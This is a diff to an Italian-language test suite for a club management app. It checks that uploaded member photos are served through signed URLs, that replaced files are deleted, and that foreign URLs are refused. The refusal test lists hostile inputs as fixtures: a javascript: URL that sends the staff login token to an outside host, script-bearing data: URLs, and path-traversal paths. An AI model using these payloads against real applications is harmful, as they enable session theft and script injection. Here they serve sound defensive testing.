@@ -2,7 +2,7 @@
 //
 // Erano serviti da `/uploads/*` senza alcun controllo. Il nome è casuale, quindi non si
 // indovina — ma un indirizzo si condivide, finisce in una cronologia, nel log di un proxy,
-// in uno screenshot. E fra quei file ci sono i certificati medici dei soci: dati sanitari.
+// in uno screenshot. E fra quei file ci sono le foto dei soci: dati personali.
 // "Difficile da indovinare" non è un controllo d'accesso, ed è il motivo per cui questo
 // test esiste.
 import test, { before, after, describe } from 'node:test';
@@ -14,7 +14,7 @@ import { buildApp } from '../src/app.js';
 import bcrypt from 'bcryptjs';
 import { inArray } from 'drizzle-orm';
 import { db, pool } from '../src/db/client.js';
-import { staffAccounts, members, memberDocuments } from '../src/db/schema/index.js';
+import { staffAccounts, members } from '../src/db/schema/index.js';
 import { config } from '../src/config.js';
 import { firmaUrl, togliFirma, firmaValida, nomeFileDa } from '../src/lib/urlFirmati.js';
 
@@ -117,16 +117,22 @@ describe("aprire un file caricato", () => {
 });
 
 // Il giro completo, che è la parte che si rompe davvero: la firma non serve a niente se
-// l'indirizzo che arriva alle schermate non ce l'ha. Le pagine mettono `documento.file_url`
-// dentro un `<a href>` così com'è, e se uscisse nudo il documento non si aprirebbe più.
+// l'indirizzo che arriva alle schermate non ce l'ha. Le pagine mettono la foto del socio in un
+// `<img src>` così com'è, e se uscisse nuda la foto non si aprirebbe più. (Prima il giro si
+// provava sui documenti, usciti dall'applicazione a novembre 2026: ora sulla foto.)
 describe("l'indirizzo che arriva alle schermate è già firmato", () => {
-	let idDocumento;
 	let idSocio;
 	let idAccount;
 	let token;
+	const idAltri = [];
 	const PASSWORD = 'prova-file-protetti-1234';
-	// Un documento "altro" chiede solo un titolo: il resto del test parla del file.
-	const documento = () => ({ member_id: idSocio, document_type: 'altro', titolo: '__Prova file protetti' });
+	const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+	const codice = () => `FP${String(Date.now() + idAltri.length).replace(/\d/g, (c) => 'ABCDEFGHIJ'[c])}`;
+	const socioConFoto = async (foto) => {
+		const [socio] = await db.insert(members).values({ nome: 'Prova', cognome: 'File Protetti', codiceSocio: codice(), fotoUrl: foto }).returning();
+		idAltri.push(socio.id);
+		return socio.id;
+	};
 
 	before(async () => {
 		// Il test si costruisce il proprio account e lo cancella: non dipende da com'è
@@ -137,143 +143,79 @@ describe("l'indirizzo che arriva alle schermate è già firmato", () => {
 			.values({ nome: 'Admin Firma File', email, passwordHash: await bcrypt.hash(PASSWORD, 4), ruolo: 'admin' })
 			.returning();
 		idAccount = account.id;
-
 		const [socio] = await db
 			.insert(members)
-			.values({ nome: 'Prova', cognome: 'File Protetti', codiceSocio: `FP${String(Date.now()).replace(/\d/g, (c) => 'ABCDEFGHIJ'[c])}` })
+			.values({ nome: 'Prova', cognome: 'File Protetti', codiceSocio: codice(), fotoUrl: `https://gripcore.it/uploads/${NOME}` })
 			.returning();
 		idSocio = socio.id;
-
-		token = (await app.inject({
-			method: 'POST',
-			url: '/api/auth/login',
-			payload: { email, password: PASSWORD },
-		})).json().token;
-
-		const creato = await app.inject({
-			method: 'POST',
-			url: '/api/entities/MemberDocument',
-			headers: { authorization: `Bearer ${token}` },
-			payload: { ...documento(), file_url: `https://gripcore.it/uploads/${NOME}` },
-		});
-		assert.equal(creato.statusCode, 201, creato.body);
-		idDocumento = creato.json().id;
+		token = (await app.inject({ method: 'POST', url: '/api/auth/login', payload: { email, password: PASSWORD } })).json().token;
 	});
 
 	after(async () => {
-		if (idSocio) {
-			await db.delete(memberDocuments).where(inArray(memberDocuments.memberId, [idSocio]));
-			await db.delete(members).where(inArray(members.id, [idSocio]));
-		}
+		await db.delete(members).where(inArray(members.id, [idSocio, ...idAltri].filter(Boolean)));
 		if (idAccount) await db.delete(staffAccounts).where(inArray(staffAccounts.id, [idAccount]));
 	});
 
-	test("il file di un documento esce firmato e si apre", async () => {
-		const letto = await app.inject({
-			method: 'GET',
-			url: `/api/entities/MemberDocument/${idDocumento}`,
-			headers: { authorization: `Bearer ${token}` },
-		});
-		const url = letto.json().file_url;
-
-		assert.match(url, /firma=/, "l'indirizzo è uscito senza firma: i documenti non si aprirebbero");
+	test('la foto esce firmata e si apre', async () => {
+		const url = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json().foto_url;
+		assert.match(url, /firma=/, "l'indirizzo è uscito senza firma: la foto non si aprirebbe");
 		assert.equal((await chiedi(url.replace('https://gripcore.it', ''))).statusCode, 200);
 	});
 
-	test("risalvando non si porta la firma nel database", async () => {
-
-		// È quello che fa il gestionale: rilegge l'indirizzo, lo mette nel modulo e lo
-		// risalva. Se la firma entrasse nel database, il documento smetterebbe di aprirsi
-		// qualche ora dopo senza che nessuno abbia toccato niente.
-		const letto = (await app.inject({
-			method: 'GET',
-			url: `/api/entities/MemberDocument/${idDocumento}`,
-			headers: { authorization: `Bearer ${token}` },
-		})).json();
-
-		await app.inject({
-			method: 'PUT',
-			url: `/api/entities/MemberDocument/${idDocumento}`,
-			headers: { authorization: `Bearer ${token}` },
-			payload: { file_url: letto.file_url },
-		});
-
-		const rileggi = (await app.inject({
-			method: 'GET',
-			url: `/api/entities/MemberDocument/${idDocumento}`,
-			headers: { authorization: `Bearer ${token}` },
-		})).json();
-
+	test('risalvando non si porta la firma nel database', async () => {
+		// È quello che fa il gestionale: rilegge l'indirizzo, lo mette nel modulo e lo risalva. Se
+		// la firma entrasse nel database, la foto smetterebbe di aprirsi qualche ora dopo.
+		const letto = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json();
+		const salvato = await scrivi('PUT', `/api/entities/Member/${idSocio}`, { foto_url: letto.foto_url });
+		assert.equal(salvato.statusCode, 200, salvato.body);
+		const rileggi = (await scrivi('GET', `/api/entities/Member/${idSocio}`)).json();
 		// Una firma sola, non una firma sopra l'altra.
-		assert.equal((rileggi.file_url.match(/firma=/g) ?? []).length, 1);
-		assert.equal(togliFirma(rileggi.file_url), `https://gripcore.it/uploads/${NOME}`);
+		assert.equal((rileggi.foto_url.match(/firma=/g) ?? []).length, 1);
+		assert.equal(togliFirma(rileggi.foto_url), `https://gripcore.it/uploads/${NOME}`);
 	});
 
-	// Le schermate mettono gli indirizzi dei file in un `<a href>`, e React non blocca
-	// `javascript:`: un indirizzo scritto a mano era codice che girava al clic di chi apriva il
-	// documento. Entra solo un file caricato da noi.
-	test("un indirizzo che non è un nostro file non entra, né in creazione né in modifica", async () => {
-		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+	// Le schermate mettono gli indirizzi dei file in un `src` o un `href`, e React non blocca
+	// `javascript:`: entra solo un file caricato da noi.
+	test('un indirizzo che non è un nostro file non entra', async () => {
 		const cattivi = [
 			"javascript:fetch('https://esempio.it/?t='+localStorage.grip_staff_token)",
 			'JavaScript:alert(1)',
 			'data:text/html,<script>alert(1)</script>',
-			'https://esempio.it/malevolo.pdf',
+			'https://esempio.it/malevolo.png',
 			'/uploads/../index.html',
-			'/uploads/sotto/file.pdf',
+			'/uploads/sotto/file.png',
 		];
-		for (const file_url of cattivi) {
-			const creato = await scrivi('POST', '/api/entities/MemberDocument', { ...documento(), file_url });
-			assert.equal(creato.statusCode, 400, `creazione accettata con ${file_url}`);
-			const bulk = await scrivi('POST', '/api/entities/MemberDocument/bulk', [{ ...documento(), file_url }]);
-			assert.equal(bulk.statusCode, 400, `creazione multipla accettata con ${file_url}`);
-			const modificato = await scrivi('PUT', `/api/entities/MemberDocument/${idDocumento}`, { file_url });
-			assert.equal(modificato.statusCode, 400, `modifica accettata con ${file_url}`);
+		for (const foto_url of cattivi) {
+			const modificato = await scrivi('PUT', `/api/entities/Member/${idSocio}`, { foto_url });
+			assert.equal(modificato.statusCode, 400, `modifica accettata con ${foto_url}`);
+			assert.match(modificato.json().error, /file/);
 		}
 	});
 
-	// "Non si può recuperare", diceva la conferma: ma il file restava sul disco, e con lui i
-	// certificati medici. Un file sostituito o di una riga eliminata va cancellato davvero.
-	test('un file sostituito o di una riga eliminata sparisce dal disco', async () => {
-		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
+	// "Non si può recuperare", diceva la conferma: ma il file restava sul disco. Un file
+	// sostituito va cancellato davvero.
+	test('un file sostituito sparisce dal disco', async () => {
 		const vecchio = `__prova-vecchio-${Date.now()}.png`;
 		const nuovo = `__prova-nuovo-${Date.now()}.png`;
 		writeFileSync(path.join(UPLOAD_DIR, vecchio), 'x');
 		writeFileSync(path.join(UPLOAD_DIR, nuovo), 'y');
-
-		const creato = await scrivi('POST', '/api/entities/MemberDocument', { ...documento(), file_url: `/uploads/${vecchio}` });
-		assert.equal(creato.statusCode, 201, creato.body);
-		const idProva = creato.json().id;
-
-		assert.equal((await scrivi('PUT', `/api/entities/MemberDocument/${idProva}`, { file_url: `/uploads/${nuovo}` })).statusCode, 200);
+		const id = await socioConFoto(`/uploads/${vecchio}`);
+		assert.equal((await scrivi('PUT', `/api/entities/Member/${id}`, { foto_url: `/uploads/${nuovo}` })).statusCode, 200);
 		assert.equal(existsSync(path.join(UPLOAD_DIR, vecchio)), false, 'il file sostituito è rimasto');
 		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), true);
-
-		assert.equal((await scrivi('DELETE', `/api/entities/MemberDocument/${idProva}`)).statusCode, 200);
-		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), false, 'il file della riga eliminata è rimasto');
+		assert.equal((await scrivi('PUT', `/api/entities/Member/${id}`, { foto_url: null })).statusCode, 200, 'vuoto vuol dire "nessun file"');
+		assert.equal(existsSync(path.join(UPLOAD_DIR, nuovo)), false, 'il file tolto è rimasto');
 	});
 
 	test('un file citato anche da un’altra riga non si cancella', async () => {
-		const scrivi = (method, url, payload) => app.inject({ method, url, headers: { authorization: `Bearer ${token}` }, payload });
 		const condiviso = `__prova-condiviso-${Date.now()}.png`;
 		writeFileSync(path.join(UPLOAD_DIR, condiviso), 'z');
-		const a = (await scrivi('POST', '/api/entities/MemberDocument', { ...documento(), file_url: `/uploads/${condiviso}` })).json();
-		const b = (await scrivi('POST', '/api/entities/MemberDocument', { ...documento(), file_url: `/uploads/${condiviso}` })).json();
-
-		await scrivi('DELETE', `/api/entities/MemberDocument/${a.id}`);
+		const a = await socioConFoto(`/uploads/${condiviso}`);
+		const b = await socioConFoto(`/uploads/${condiviso}`);
+		await scrivi('PUT', `/api/entities/Member/${a}`, { foto_url: null });
 		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), true, "l'altra riga lo usa ancora");
-		await scrivi('DELETE', `/api/entities/MemberDocument/${b.id}`);
+		await scrivi('PUT', `/api/entities/Member/${b}`, { foto_url: null });
 		assert.equal(existsSync(path.join(UPLOAD_DIR, condiviso)), false);
-	});
-
-	test('un indirizzo vuoto resta ammesso: vuol dire "nessun file"', async () => {
-		const modificato = await app.inject({
-			method: 'PUT',
-			url: `/api/entities/MemberDocument/${idDocumento}`,
-			headers: { authorization: `Bearer ${token}` },
-			payload: { file_url: null },
-		});
-		assert.equal(modificato.statusCode, 200, modificato.body);
 	});
 });
 
